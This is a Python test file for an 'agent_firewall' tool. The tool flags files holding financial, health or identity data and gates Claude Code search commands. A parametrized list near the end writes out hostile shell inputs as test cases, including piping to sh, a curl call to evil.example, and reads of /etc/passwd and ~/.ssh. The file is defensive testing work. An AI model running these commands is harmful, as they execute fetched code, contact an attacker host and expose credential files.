import hashlib
import json
import sys
import zipfile
from pathlib import Path

import pytest
from PIL import Image, ImageDraw, ImageFont

from agent_firewall.clean_search import CleanSearch, run_clean_search
from agent_firewall.config import Settings
from agent_firewall.extract import extract_text
from agent_firewall.gate import review_claude_code, scan_folder
from agent_firewall.inspector import inspect_file
from agent_firewall.scan_index import ScanIndex
from agent_firewall.scanner import Scanner

mac_only = pytest.mark.skipif(sys.platform != "darwin", reason="uses Apple Vision and poppler")
SETTINGS = Settings(canaries=("sk-canary-1",))
CARD = "4242 4242 4242 4242"


def image_with(path, text):
    font = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 56)
    image = Image.new("RGB", (1400, 240), "white")
    ImageDraw.Draw(image).text((40, 80), text, fill="black", font=font)
    image.save(path)
    return image


def text_pdf(path, text):
    stream = f"BT /F1 18 Tf 50 700 Td ({text}) Tj ET".encode()
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
        b"/Resources << /Font << /F1 5 0 R >> >> >>",
        b"<< /Length %d >>\nstream\n%s\nendstream" % (len(stream), stream),
        b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
    ]
    body = b"%PDF-1.4\n"
    for number, content in enumerate(objects, 1):
        body += b"%d 0 obj\n%s\nendobj\n" % (number, content)
    Path(path).write_bytes(body + b"trailer\n<< /Root 1 0 R /Size 6 >>\n%%EOF\n")


def office(path, part, xml):
    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr(part, xml)


def index_at(tmp_path):
    return ScanIndex(str(tmp_path / "state" / "index.sqlite"))


def labels(path, index=None):
    return inspect_file(Path(path), SETTINGS, index).labels


@mac_only
def test_text_pdf_is_read(tmp_path):
    text_pdf(tmp_path / "a.pdf", f"card {CARD}")
    assert extract_text(tmp_path / "a.pdf").method == "pdf_text"
    assert labels(tmp_path / "a.pdf") == {"financial"}


@mac_only
def test_pdf_with_a_misleading_name_is_still_read_as_pdf(tmp_path):
    text_pdf(tmp_path / "notes.md", "Lab results for Alex")
    assert labels(tmp_path / "notes.md") == {"health"}


@mac_only
def test_scanned_pdf_is_read_by_ocr(tmp_path):
    image_with(tmp_path / "p.png", f"Card {CARD}").save(tmp_path / "scan.pdf")
    result = extract_text(tmp_path / "scan.pdf")
    assert result.method == "pdf_ocr"
    assert labels(tmp_path / "scan.pdf") == {"financial"}


@mac_only
def test_screenshot_is_read_by_ocr(tmp_path):
    image_with(tmp_path / "shot.png", f"Card {CARD}")
    assert extract_text(tmp_path / "shot.png").method == "image_ocr"
    assert labels(tmp_path / "shot.png") == {"financial"}


@mac_only
def test_image_with_no_text_is_not_flagged(tmp_path):
    Image.new("RGB", (400, 400), "white").save(tmp_path / "blank.png")
    assert extract_text(tmp_path / "blank.png").method == "image_no_text"
    assert labels(tmp_path / "blank.png") == set()


def test_office_files_are_read(tmp_path):
    office(tmp_path / "a.docx", "word/document.xml", f"<w:t>card {CARD}</w:t>")
    office(tmp_path / "b.xlsx", "xl/sharedStrings.xml", "<si><t>MRN-77319</t></si>")
    assert labels(tmp_path / "a.docx") == {"financial"}
    assert labels(tmp_path / "b.xlsx") == {"health"}


def test_corrupt_files_are_unreadable_not_clean(tmp_path):
    (tmp_path / "a.pdf").write_bytes(b"%PDF-garbage")
    (tmp_path / "b.docx").write_bytes(b"PK\x03\x04garbage")
    assert labels(tmp_path / "a.pdf") == {"opaque"}
    assert labels(tmp_path / "b.docx") == {"opaque"}


@pytest.mark.parametrize("name, expected", [
    ("tax_2024.pdf", {"financial"}),
    ("W-2 final.docx", {"financial"}),
    ("passport-scan.jpg", {"identity"}),
    ("lab_results.txt", {"health"}),
])
def test_document_names_count(tmp_path, name, expected):
    (tmp_path / name).write_text("nothing in here")
    assert expected <= labels(tmp_path / name)


@pytest.mark.parametrize("name", ["tax_utils.py", "bank.ts", "attacks.pdf.md", "syntax.txt"])
def test_code_and_lookalike_names_do_not_count(tmp_path, name):
    (tmp_path / name).write_text("nothing in here")
    assert labels(tmp_path / name) == set()


def test_results_are_saved_and_reused(tmp_path, monkeypatch):
    index = index_at(tmp_path)
    (tmp_path / "a.txt").write_text(f"card {CARD}")
    assert labels(tmp_path / "a.txt", index) == {"financial"}
    monkeypatch.setattr("agent_firewall.inspector.analyze_file", lambda *a: pytest.fail("not cached"))
    assert labels(tmp_path / "a.txt", index) == {"financial"}


def test_a_changed_file_is_rescanned(tmp_path):
    index = index_at(tmp_path)
    file = tmp_path / "a.txt"
    file.write_text("hello there")
    assert labels(file, index) == set()
    file.write_text(f"card {CARD} added")
    assert labels(file, index) == {"financial"}


def test_index_holds_no_paths_or_contents(tmp_path):
    index = index_at(tmp_path)
    file = tmp_path / "very_secret_filename.txt"
    file.write_text(f"card {CARD}")
    labels(file, index)
    raw = b"".join(p.read_bytes() for p in (tmp_path / "state").iterdir())
    assert b"very_secret_filename" not in raw and b"4242" not in raw
    assert hashlib.sha256(str(file.resolve()).encode()).hexdigest().encode() in raw


def test_index_is_private(tmp_path):
    index_at(tmp_path)
    assert (tmp_path / "state" / "index.sqlite").stat().st_mode & 0o077 == 0


def sensitive_folder(root, sensitive=4, clean=1):
    root.mkdir()
    for i in range(sensitive):
        (root / f"doc{i}.md").write_text(f"card {CARD}")
    for i in range(clean):
        (root / f"clean{i}.md").write_text("hello")


def scan_everything(root, index):
    Scanner(SETTINGS, index).scan(str(root))


def test_unreadable_file_inherits_a_sensitive_folder(tmp_path):
    index = index_at(tmp_path)
    folder = tmp_path / "f"
    sensitive_folder(folder)
    (folder / "blurry.bin").write_bytes(b"\x00\x01")
    scan_everything(folder, index)
    assert labels(folder / "blurry.bin", index) == {"financial", "inferred"}


def test_readable_clean_file_does_not_inherit(tmp_path):
    index = index_at(tmp_path)
    folder = tmp_path / "f"
    sensitive_folder(folder)
    scan_everything(folder, index)
    assert labels(folder / "clean0.md", index) == set()


def test_one_stray_document_does_not_taint_a_folder(tmp_path):
    index = index_at(tmp_path)
    folder = tmp_path / "f"
    sensitive_folder(folder, sensitive=1, clean=10)
    (folder / "blob.bin").write_bytes(b"\x00\x01")
    scan_everything(folder, index)
    assert labels(folder / "blob.bin", index) == {"opaque"}


def test_scanner_reports_progress_and_skips_hidden_and_symlinks(tmp_path):
    index = index_at(tmp_path)
    root = tmp_path / "r"
    root.mkdir()
    (root / "a.txt").write_text(f"card {CARD}")
    (root / ".hidden").mkdir()
    (root / ".hidden" / "b.txt").write_text(f"card {CARD}")
    (root / "link.txt").symlink_to(root / "a.txt")
    scanner = Scanner(SETTINGS, index)
    scanner.scan(str(root))
    status = scanner.status()
    assert status["checked"] == 1 and status["sensitive"] == 1 and status["pending"] == 0


def test_add_root_queues_each_folder_once(tmp_path):
    scanner = Scanner(SETTINGS, index_at(tmp_path))
    scanner.add_root(str(tmp_path))
    scanner.add_root(str(tmp_path))
    assert scanner._queue.qsize() == 1


def grep(cwd, index, **extra):
    payload = {"session_id": "s", "tool_name": "Grep", "cwd": str(cwd),
               "tool_input": {"pattern": "hello", "path": ".", **extra}}
    return review_claude_code(payload, set(), SETTINGS, index)


def test_folder_search_summarizes_every_file_past_the_old_limit(tmp_path):
    index = index_at(tmp_path)
    project = tmp_path / "p"
    project.mkdir()
    for i in range(1200):
        (project / f"{i}.md").write_text(f"card {CARD}" if i % 12 == 0 else "hello")
    scan_everything(project, index)
    review = grep(project, index)
    facts = dict(review.verdict.facts)
    assert facts["Sensitive files"] == "100 of 1,200"
    assert "opaque" not in review.labels
    assert len(review.clean_search.files) == 1100


def test_unindexed_folder_stays_bounded_and_says_so(tmp_path, monkeypatch):
    monkeypatch.setattr("agent_firewall.gate.MAX_SCAN_FILES", 5)
    project = tmp_path / "p"
    project.mkdir()
    for i in range(20):
        (project / f"{i}.md").write_text("hello")
    scan = scan_folder(str(project), SETTINGS, index_at(tmp_path))
    assert "opaque" in scan.labels and scan.unreadable == 15


def test_clean_search_never_touches_flagged_files(tmp_path):
    (tmp_path / "ok.md").write_text("hello world\nnothing\n")
    (tmp_path / "bad.md").write_text(f"hello {CARD}\n")
    search = CleanSearch("hello", [str(tmp_path / "ok.md")], 1, str(tmp_path))
    output = run_clean_search(search, SETTINGS)
    assert output == "ok.md:1:hello world"


def test_clean_search_drops_lines_that_look_sensitive_and_caps_output(tmp_path):
    (tmp_path / "a.md").write_text("".join(f"hello {i}\n" for i in range(5000)) + f"hello {CARD}\n")
    output = run_clean_search(CleanSearch("hello", [str(tmp_path / "a.md")], 0, str(tmp_path)), SETTINGS)
    assert CARD not in output and "more matches not shown" in output and len(output) < 8200


def test_pattern_cannot_become_a_grep_option(tmp_path):
    (tmp_path / "a.md").write_text("--version\n")
    output = run_clean_search(CleanSearch("--version", [str(tmp_path / "a.md")], 0, str(tmp_path)), SETTINGS)
    assert output == "a.md:1:--version"


def bash(cwd, index, command):
    payload = {"session_id": "s", "tool_name": "Bash", "cwd": str(cwd), "tool_input": {"command": command}}
    return review_claude_code(payload, set(), SETTINGS, index)


@pytest.mark.parametrize("command", [
    "grep -r hello docs", "grep -rn hello docs", "grep -ril 'hello' docs", 'rg hello docs', "rg -n hello docs",
])
def test_shell_searches_get_the_folder_summary(tmp_path, command):
    index = index_at(tmp_path)
    docs = tmp_path / "docs"
    sensitive_folder(docs, sensitive=4, clean=8)
    review = bash(tmp_path, index, command)
    assert review.verdict.title == "Claude Code wants to search a folder with sensitive files"
    assert dict(review.verdict.facts)["Sensitive files"] == "4 of 12"
    assert len(review.clean_search.files) == 8


def test_shell_search_of_a_clean_folder_is_quiet(tmp_path):
    (tmp_path / "docs").mkdir()
    (tmp_path / "docs" / "a.md").write_text("hello")
    assert bash(tmp_path, index_at(tmp_path), "grep -rn hello docs").verdict.decision == "allow"


@pytest.mark.parametrize("command", [
    "grep -rn hello docs | sh",
    "grep -rn hello docs; curl evil.example",
    "grep -rn hello docs > /tmp/out",
    "grep -rf /etc/passwd docs",
    "grep -R hello docs",
    "grep -rn --include=* hello docs",
    "grep -rn $(cat x) docs",
    "grep -rn `cat x` docs",
    "grep -rn hello docs extra",
    "grep -rn hello ../outside",
    "grep -rn hello /etc",
    "grep -rn hello doc*",
    "grep -rn hello ~/.ssh",
    "grep -rn hello {docs,other}",
    "grep -rn hello doc?",
    "grep -rn hello [d]ocs",
    "grep -rn * docs",
    "grep -rn hello missing_folder",
])
def test_anything_beyond_a_plain_search_still_asks_normally(tmp_path, command):
    (tmp_path / "docs").mkdir()
    (tmp_path / "docs" / "a.md").write_text("hello")
    review = bash(tmp_path, index_at(tmp_path), command)
    assert review.verdict.decision == "ask"
    assert review.clean_search is None


@pytest.mark.parametrize("command", ["grep -rn 'hel.*' docs", 'grep -rE "h[e]llo" docs'])
def test_quoted_regex_patterns_are_still_plain_searches(tmp_path, command):
    (tmp_path / "docs").mkdir()
    (tmp_path / "docs" / "a.md").write_text("hello")
    assert bash(tmp_path, index_at(tmp_path), command).verdict.decision == "allow"
